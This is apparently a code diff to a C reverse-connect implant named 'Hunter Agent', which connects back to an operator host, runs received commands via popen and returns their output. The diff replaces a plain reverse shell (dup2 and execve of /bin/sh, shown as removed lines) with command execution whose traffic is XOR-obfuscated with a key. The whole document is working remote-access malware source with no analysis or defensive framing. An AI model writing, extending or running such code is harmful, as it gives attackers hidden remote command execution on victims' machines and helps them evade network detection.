@@ -4,7 +4,7 @@
 #include <string.h>
 #include <stdlib.h>
 #include <sys/wait.h>
-
+#include "helpers.c"
 #include "payload_common.h"
 
 #define MAXBUF 65536
@@ -13,6 +13,8 @@ int main(void)
 {
 	int connection_established;
 	char* ip = LHOST;
+	char* key = KEY;
+	int keylen = strlen(key);
 	int port = PORT;
 	int n = 0;
 	char buf[MAXBUF];
@@ -27,54 +29,75 @@ int main(void)
 		connection_established = connect(sock, (struct sockaddr *) &sa, sizeof(sa)); 
 	} while(connection_established != 0);
 
-	write(sock, MSG_HELLO, strlen(MSG_HELLO));
+	char* xorhello = XOR("Hunter Agent v1.0\n", key, 18, keylen);
+	write(sock, xorhello, 18);
 
 	while (connection_established == 0)
 	{
 		while((n = read(sock, buf, MAXBUF)) > 0)
 		{
+			char* xorbuf = XOR(buf, key, n, keylen);
 			// TODO: Revamp argument parsing (there's a better way! :)
-			if(strncmp(buf, "help\n", 5) == 0)
+			if(strncmp(xorbuf, "help\n", 5) == 0)
 			{
-				write(sock, MSG_HELP, strlen(MSG_HELP));
+				char* xorhelp = XOR(MSG_HELP, key, strlen(MSG_HELP), keylen);
+				write(sock, xorhelp, strlen(MSG_HELP));
 			}
-
-			else if(strncmp(buf, "shell\n", 6) == 0)
+			
+			else if(str_starts_with(xorbuf, "shell") == 0)
 			{
 
 				int status = 0;
 				pid_t wpid, child_pid;
-
-				char* const argv[] = {"/bin/sh", NULL};
+				FILE* fp;
+				
+				
+				char* cmd = split(xorbuf, " ");			
+	
 				if((child_pid = fork()) == 0)
 				{
 					char shell_msg[50];
-					snprintf(shell_msg, 50, "\nReverse shell session started on PID %i\n", getpid());
-					write(sock, shell_msg, strlen(shell_msg));
+					snprintf(shell_msg, 50, "\n[+] Executing command on PID %i\n\n", getpid());
+					char* xorshellmsg = XOR(shell_msg, key, strlen(shell_msg), keylen);
+					write(sock, xorshellmsg, strlen(shell_msg));
 
-					dup2(sock, 0);
-					dup2(sock, 1);
-					dup2(sock, 2);
-					// Create a child process and start shell inside of it
-					execve("/bin/sh", argv, NULL);
+					// Create a child process and run command inside of it
+					fp = popen(cmd, "r");
+					if(fp == NULL) {
+					    char* error = "Failed to run command\n";
+					    char* xorerror = XOR(error, key, strlen(error), keylen);
+					    write(sock, xorerror, strlen(error));
+					    
+					}
+					char path[2050];
+					char command[12000];
+					while (fgets(path, sizeof(path), fp) != NULL) {
+					    strncat(command, path, strlen(path));
+					}
+					char* xordata = XOR(command, key, strlen(command), keylen);
+					write(sock, xordata, strlen(command));
+					free(xordata);
+					
 					exit(EXIT_SUCCESS);
 				}
 				// Make the parent process wait for child process to terminate
-				while ((wpid = wait(&status)) > 0);     
+		//		while ((wpid = wait(&status)) > 0);
 
-				write(sock, MSG_EXIT_RSHELL, strlen(MSG_EXIT_RSHELL));
 			}
-
-			else if(strncmp(buf, "exit\n", 5) == 0)
+			else if(strncmp(xorbuf, "\n", 1) == 0)
 			{
-				write(sock, MSG_EXIT_CMD, strlen(MSG_EXIT_CMD));
-				exit(EXIT_SUCCESS);
+				char* xornewline = XOR("\n", key, 1, keylen);
+				write(sock, xornewline, 1);
+		
 			}
 
 			else
 			{
-				write(sock, MSG_INVALID, strlen(MSG_INVALID));
+				char* xorinvalid = XOR(MSG_INVALID, key, strlen(MSG_INVALID), keylen);
+				write(sock, xorinvalid, strlen(MSG_INVALID));
 			}		
+			
+			memset(buf, '\0', strlen(buf));
 		}
 	}
 
